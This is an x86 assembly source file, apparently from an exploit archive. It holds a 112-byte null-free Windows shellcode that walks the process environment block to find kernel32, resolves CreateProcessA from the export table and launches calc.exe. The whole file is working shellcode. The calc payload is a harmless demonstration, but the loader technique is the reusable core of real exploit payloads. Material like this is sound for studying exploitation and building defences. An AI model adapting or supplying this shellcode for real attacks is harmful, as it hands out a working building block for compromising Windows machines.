;------------------------------------------------------------------------
;Title...................All Windows Null-free CreateProcessA Calc
;........................Shellcode 112 Bytes
;Release Date............7/5/2011
;Tested On...............Windows 2000, Windows XP, Windows XP x64,
;........................Windows Vista, Windows 7, Windows 8 M3 x64
;------------------------------------------------------------------------
;Author..................John Leitch
;Site....................http://www.autosectools.com/
;Email...................john@autosectools.com
;------------------------------------------------------------------------
;https://packetstormsecurity.com/files/102847/All-Windows-Null-Free-CreateProcessA-Calc-Shellcode.html


use32

	xor ebx, ebx

	;================================
	;Find Kernel32 Base
	;================================
	mov edi, [fs:ebx+0x30]
	mov edi, [edi+0x0c]
	mov edi, [edi+0x1c]

module_loop:
	mov eax, [edi+0x08]
	mov esi, [edi+0x20]
	mov edi, [edi]
	cmp byte [esi+12], '3'
	jne module_loop

	;================================
	;Kernel32 PE Header
	;================================
	mov edi, eax
	add edi, [eax+0x3c]

	;================================
	; Export directory table
	;================================
	;0x00 Export Flags
	;0x04 Time/Date Stamp
	;0x08 Major Version
	;0x0A Minor Version
	;0x0C Name RVA
	;0x10 Ordinal Base
	;0x14 Address Table Entries
	;0x18 Number Of Names
	;0x1c Address Table RVA
	;0x20 Name Pointer Table RVA
	;0x24 Ordinal Table RVA
	;================================

	;================================
	;Kernel32 Export Directory Table
	;================================
	mov edx, [edi+0x78]
	add edx, eax

	;================================
	;Kernel32 Name Pointers
	;================================
	mov edi, [edx+0x20]
	add edi, eax

	;================================
	;Find CreateProcessA
	;================================
	mov ebp, ebx
name_loop:
	mov esi, [edi+ebp*4]
	add esi, eax
	inc ebp
	cmp dword [esi],   0x61657243 ;Crea
	jne name_loop
	cmp dword [esi+8], 0x7365636f ;oces
	jne name_loop

	;================================
	;CreateProcessA Ordinal
	;================================
	mov edi, [edx+0x24]
	add edi, eax
	mov bp, [edi+ebp*2]

	;================================
	;CreateProcessA Address
	;================================
	mov edi, [edx+0x1C]
	add edi, eax
	mov edi, [edi+(ebp-1)*4] ;subtract ordinal base
	add edi, eax

	;================================
	;Zero Memory
	;================================
	mov ecx, ebx
	mov cl, 0xFF
zero_loop:
	push ebx
	loop zero_loop

	push 0x636c6163 ;calc
	mov edx, esp

	;================================
	;Call CreateProcessA
	;================================
	push edx ;__out        LPPROCESS_INFORMATION lpProcessInformation
	push edx ;__in         LPSTARTUPINFO lpStartupInfo,
	push ebx ;__in_opt     LPCTSTR lpCurrentDirectory,
	push ebx ;__in_opt     LPVOID lpEnvironment,
	push ebx ;__in         DWORD dwCreationFlags,
	push ebx ;__in         BOOL bInheritHandles,
	push ebx ;__in_opt     LPSECURITY_ATTRIBUTES lpThreadAttributes,
	push ebx ;__in_opt     LPSECURITY_ATTRIBUTES lpProcessAttributes,
	push edx ;__inout_opt  LPTSTR lpCommandLine,
	push ebx ;__in_opt     LPCTSTR lpApplicationName,
	call edi